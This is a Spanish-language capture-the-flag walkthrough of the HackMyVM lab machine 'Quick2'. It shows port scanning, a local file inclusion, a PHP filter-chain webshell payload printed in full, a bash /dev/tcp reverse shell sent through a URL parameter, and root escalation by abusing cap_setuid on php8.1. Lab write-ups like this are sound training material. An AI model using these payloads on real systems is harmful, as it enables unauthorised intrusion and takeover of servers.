---
icon: flag
---

# Quick2 HackMyVM (Easy - Linux)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-19 03:23 EDT
Nmap scan report for 192.168.5.61
Host is up (0.0059s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 17:c4:c9:b5:94:24:9f:9c:db:33:34:d1:99:b7:23:1e (ECDSA)
|_  256 ce:83:07:4b:42:70:87:47:37:4d:d9:d6:8d:56:28:62 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Quick Automative
|_http-server-header: Apache/2.4.52 (Ubuntu)
MAC Address: 08:00:27:D7:AD:4A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.73 seconds
```

Veremos que hay un puerto `80` en el que aloja una pagina web, si entramos dentro, efectivamente veremos una pagina web aparente mente normal, pero si investigamos toqueteando un poco la misma y nos fijamos en la `URL` veremos lo siguiente.

Si nos vamos a `Home` para que nos lleve a dicha pagina, veremos en la `URL` esto:

```
URL = http://<IP>/index.php?page=home.php
```

Posiblemente pueda tener un `LFI` por lo que vamos a probarlo a ver si funciona.

## FFUF

```shell
ffuf -u 'http://<IP>/index.php?FUZZ=../../../../../../../etc/passwd' -w <WORDLIST> -fs 3825
```

Info:

```

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.5.61/index.php?FUZZ=../../../../../../../etc/passwd
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 3825
________________________________________________

page                    [Status: 200, Size: 3104, Words: 247, Lines: 68, Duration: 9ms]
[WARN] Caught keyboard interrupt (Ctrl-C)
```

Con esto veremos que si es vulnerable el parametro `page` a un `LFI`:

```
URL = http://<IP>/index.php?page=../../../../../../../etc/passwd
```

Info:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
andrew:x:1000:1000:Andrew Speed:/home/andrew:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
nick:x:1001:1001:Nick Greenhorn,,,:/home/nick:/bin/bash
```

Vemos que funciona, por lo que vamos a probar a utilizar `warppers` con el `LFI` para realizar un `RCE` de esta forma.

## Escalate user www-data

Pero veremos que no va a funcionar, vamos a seguir explorando un poco mas.

## Gobuster

```shell
gobuster dir -u http://<IP>/ -w <WORDLIST> -x html,php,txt -t 50 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.5.61/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 3825]
/.php                 (Status: 403) [Size: 277]
/.html                (Status: 403) [Size: 277]
/images               (Status: 200) [Size: 2289]
/home.php             (Status: 200) [Size: 2539]
/news.php             (Status: 200) [Size: 560]
/contact.php          (Status: 200) [Size: 1395]
/about.php            (Status: 200) [Size: 1446]
/cars.php             (Status: 200) [Size: 1502]
/file.php             (Status: 200) [Size: 200]
/connect.php          (Status: 500) [Size: 0]
Progress: 13120 / 882244 (1.49%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 13199 / 882244 (1.50%)
===============================================================
Finished
===============================================================
```

Veremos que encontramos un archivo bastante interesante en el que si entramos llamado `file.php` veremos lo siguiente:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-07-19 094505.png" alt=""><figcaption></figcaption></figure>

Vemos que es vulnerable a un `LFI` metiendo el archivo que queremos leer dentro de la casilla que muestra, si lo hacemos en la `URL` veremos esto:

```
URL = http://<IP>/file.php?file=/etc/passwd
```

Por lo que vamos a probar en este archivo los `wrappers` que comentaba antes...

#### LFI / RFI usando wrappers

Nos iremos a la siguiente pagina en la cual podremos generar un `payload` en formato `wrapper` en `PHP` para poder injectarlo en la `URL` y posteriormente poder ejecutar comandos gracias al mismo.

URL = https://github.com/synacktiv/php\_filter\_chains\_oracle\_exploit/blob/main/filters\_chain\_oracle\_exploit.py

Crearemos un parametro llamado `cmd` que ejecute cualquier comando que le pongamos, seria de la siguiente forma...

```shell
python3 php_filter_chain_generator.py --chain '<?php echo shell_exec($_GET["cmd"]);?>'
```

Info:

```
[+] The following gadget chain will generate the following code : <?php echo shell_exec($_GET["cmd"]);?> (base64 value: PD9waHAgZWNobyBzaGVsbF9leGVjKCRfR0VUWyJjbWQiXSk7Pz4)
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UTF16.EUC-JP-MS|convert.iconv.ISO-8859-1.ISO_6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp
```

Copiamos a partir del `php://...` y lo metemos despues del igual de la siguiente manera...

```
URL = http://<IP>/file.php?cmd=whoami&file=<CONTENT_GENERATE>
```

Info:

```
www-data
�
P�����
```

Veremos que esta funcionando, por lo que vamos a ejecutar una `reverse shell` de esta forma:

```
URL = http://<IP>/file.php?cmd=bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/<IP>/<PORT>%200>%261'&file=<CONTENT_GENERATE>
```

Info:

```
listening on [any] 7777 ...
connect to [192.168.5.50] from (UNKNOWN) [192.168.5.60] 35990
bash: cannot set terminal process group (768): Inappropriate ioctl for device
bash: no job control in this shell
www-data@quick2:/var/www/html$ whoami
whoami
www-data
```

Con esto veremos que ha funcionado, por lo que sanitizaremos la `shell`.

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

Por lo que vamos a leer la `flag` del usuario.

> user.txt

```



            :'#######::'##::::'##:'####::'######::'##:::'##:::::'#######::
            '##.... ##: ##:::: ##:. ##::'##... ##: ##::'##:::::'##.... ##:
             ##:::: ##: ##:::: ##:: ##:: ##:::..:: ##:'##::::::..::::: ##:
             ##:::: ##: ##:::: ##:: ##:: ##::::::: #####::::::::'#######::
             ##:'## ##: ##:::: ##:: ##:: ##::::::: ##. ##::::::'##::::::::
             ##:.. ##:: ##:::: ##:: ##:: ##::: ##: ##:. ##::::: ##::::::::
            : ##### ##:. #######::'####:. ######:: ##::. ##:::: #########:
            :.....:..:::.......:::....:::......:::..::::..:::::.........::






          ⣀⣀⣀⣀⣠⣤⣤⣤⠶⠶⠶⢦⣤⣤⣤⣄⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣤⠤⠤⠤⢤⣤⣤⣤⣤⣄⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
          ⣟⠛⠿⢭⣛⣉⠉⠉⠉⠉⠉⠉⠙⢿⡁⠀⠀⠉⠉⠉⠉⠛⣦⠤⠖⠒⠚⠛⠛⠛⠛⠛⢓⣶⠶⠖⠚⠉⢙⣁⣭⠭⠿⠛⠛⠛⠻⢶⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
          ⢽⣄⢀⣠⡴⠛⠉⠉⠉⠉⠻⡗⠚⢻⡇⠀⠀⠀⠀⠀⣠⡴⠋⠀⠀⠀⠀⠀⢀⣠⠴⠚⠉⠀⠤⢤⡶⠊⠉⠀⠹⡄⠀⠀⠀⠀⠀⠀⠉⠻⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
          ⠀⠉⠉⠀⠀⠀⠀⢀⣤⣴⣾⣥⣶⡾⣷⣀⣀⣠⣴⣿⠥⠤⣄⣀⣀⣀⡤⠖⠉⠀⠀⠀⠀⠀⠀⡜⠀⠀⠀⠀⠀⢹⣄⣀⣀⣀⣀⣀⣀⣀⣀⣹⣿⣶⣶⣤⣤⣀⡀⠀⠀⠀⠀⠀
          ⠀⠀⠀⠀⠀⣰⠟⠻⠯⠥⣄⣄⣿⠓⠛⡛⢉⣭⣤⣤⣤⠤⠴⠚⠛⠁⠀⠀⠀⠈⠉⠉⠉⠉⠙⠛⠉⠉⠉⠉⠉⠉⣿⡁⠀⠀⠀⠀⢀⣀⣀⣀⣀⣉⣧⣀⢉⡽⠛⠛⢳⣦⡄⠀
          ⠀⠀⠀⠀⢰⡿⣄⡀⠀⠀⠀⠀⢉⣹⡿⢻⣿⠿⣿⣇⡉⣑⣦⣀⣀⣀⡤⠤⠤⣤⣤⡶⠶⠶⠶⠷⠶⢾⣉⠉⠉⠉⠙⡏⠉⠉⠉⠉⠉⠉⠁⠀⠀⠈⢹⢻⣿⠇⠀⣴⣿⣿⣿⣿
          ⠀⠀⠀⢠⡿⠀⠀⠉⠉⠙⠒⣶⡟⢉⣿⡿⠁⠀⢸⣿⠋⠉⣿⠀⠀⠀⢀⡤⠞⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠲⡄⠀⠸⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡟⠀⢰⣿⣿⣿⣿⢻
          ⠀⠀⠀⢸⡷⣦⣀⡀⠀⠀⠘⢿⣧⠞⢫⣷⣄⣠⠏⣸⠀⠀⡏⠀⢀⡴⠋⠀⠀⠀⠀⠀⢀⣴⣶⣶⣶⡦⣄⡀⠀⠈⢦⠀⢧⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⡿⠀⠀⣿⣿⣿⣾⣿⣴
          ⠀⠀⠀⢸⣷⡇⠀⠉⠑⣶⠀⠀⠀⠀⠀⠉⠉⠀⠐⡇⠀⢸⡇⣠⠟⠀⠀⠀⠀⠀⣠⣾⣿⡟⢀⣽⣧⡹⣟⣷⡀⠀⠈⣧⠸⡄⠀⠀⠀⠀⢀⣀⣠⣼⣿⠃⠀⢀⡇⠻⣿⣿⠟⠛
          ⠀⠀⠀⢸⡿⢷⣄⡀⢀⡇⠀⣀⣀⣀⣀⣀⣀⠀⢀⠇⠀⠈⢻⡟⠲⢶⣶⣶⣶⣶⣿⣿⣿⣿⣿⣿⠟⢷⢸⣹⣷⠀⠀⠘⣆⣧⣠⢤⣶⣾⣿⣿⣷⣿⣿⠤⠴⠚⠉⠉⠉⠁⠀⠀
          ⠀⠀⠀⢸⣿⣦⣍⡛⠻⠃⡜⠉⠉⠀⠈⠉⢹⡆⢸⠀⠀⠀⠈⢧⡀⠀⠀⢀⡝⢉⣿⣿⣿⣿⣿⣅⡀⣸⢻⢿⣿⠀⠀⠀⢹⡿⢷⣾⡿⠿⠛⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
          ⠀⠀⠀⠻⣿⣿⢿⣿⣷⣶⣧⣄⣀⣀⠀⠀⢸⡇⢸⠀⠀⠀⠀⠀⠉⠑⠲⡞⠀⠀⣿⣿⣿⡿⠿⣿⣿⠇⣼⡾⣹⠀⠀⣀⠼⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
          ⠀⠀⠀⠀⠈⠻⢶⣭⣛⣻⣿⣷⡾⢿⣿⣿⣿⣷⣿⡦⠤⣤⣤⣀⣀⣠⣼⡇⠀⠀⠹⣿⣿⣿⠀⡨⢏⣼⣿⣧⣧⠴⠊⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
          ⠀⠀⠀⠀⠀⠀⠀⠘⠻⢯⣉⠙⣷⣼⣿⣇⣳⣿⠈⢧⠀⠸⣄⡰⠋⠀⠀⣧⣄⡀⠀⠈⠻⠽⢯⣿⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
          ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠛⠿⠿⠿⢧⣬⣷⣶⣞⣁⣤⣤⣤⡵⠀⠉⠙⠒⠒⠛⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀


          HMV{Its-gonna-be-a-fast-ride}
```

## Escalate Privileges

Si listamos las `capabilities` que tenemos a nivel de sistema con dicho usuario, veremos lo siguiente:

```shell
getcap -r / 2>/dev/null
```

Info:

```
/usr/bin/ping cap_net_raw=ep
/usr/bin/mtr-packet cap_net_raw=ep
/usr/bin/php8.1 cap_setuid=ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep
/snap/core20/2599/usr/bin/ping cap_net_raw=ep
/snap/core20/1405/usr/bin/ping cap_net_raw=ep
/snap/snapd/24792/usr/lib/snapd/snap-confine cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_sys_chroot,cap_sys_ptrace,cap_sys_admin=p
```

De aqui la unica que nos interesa y que vemos bastante interesante es la siguiente linea:

```
/usr/bin/php8.1 cap_setuid=ep
```

Por lo que haremos lo siguiente:

```shell
CMD="/bin/bash"
php8.1 -r "posix_setuid(0); system('$CMD');"
```

Info:

```
root@quick2:/# whoami
root
```

Con esto ya seremos `root`, por lo que vamos a leer la `flag` de `root`.

> root.txt

```


                             :'#######::'##::::'##:'####::'######::'##:::'##:::::'#######::
                             '##.... ##: ##:::: ##:. ##::'##... ##: ##::'##:::::'##.... ##:
                              ##:::: ##: ##:::: ##:: ##:: ##:::..:: ##:'##::::::..::::: ##:
                              ##:::: ##: ##:::: ##:: ##:: ##::::::: #####::::::::'#######::
                              ##:'## ##: ##:::: ##:: ##:: ##::::::: ##. ##::::::'##::::::::
                              ##:.. ##:: ##:::: ##:: ##:: ##::: ##: ##:. ##::::: ##::::::::
                             : ##### ##:. #######::'####:. ######:: ##::. ##:::: #########:
                             :.....:..:::.......:::....:::......:::..::::..:::::.........::








           ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣠⣤⣤⣤⢶⠶⣶⢲⣒⢓⠛⠛⣋⣉⣉⣉⣉⣉⣉⣉⣍⣭⣹⣭⣏⣝⣩⣙⣋⣿⣿⠿⢿⣿⣿⣿⣿⣶⣶⣷⣾⣶⣦⣤⣄⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣠⣴⣶⡶⠟⠛⠋⠋⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠁⠈⠀⠉⠈⠈⠀⠁⠀⠉⠈⢉⣽⠟⣉⣴⣶⣿⣿⣿⣿⠿⡿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣦⣤⣄⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣾⠿⠟⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⠟⣱⣿⣿⠿⠋⠉⠀⠀⠀⠀⠀⠄⢀⠹⣿⡟⢶⡝⣶⡙⠳⣯⡙⠻⣷⣭⣛⡿⠿⣶⣶⣤⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣤⣤⣴⣾⡿⠿⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡿⠁⢠⣿⣿⣧⠀⠀⠀⣠⡴⠶⠶⠶⠶⠦⢤⣄⡹⣦⠹⣦⢙⣶⣼⣷⠶⠟⠻⠿⠿⣶⣼⣭⣿⠾⠉⠙⡛⣶⣦⣤⣀⠀⠀⠀⠀⠀⠀⠀
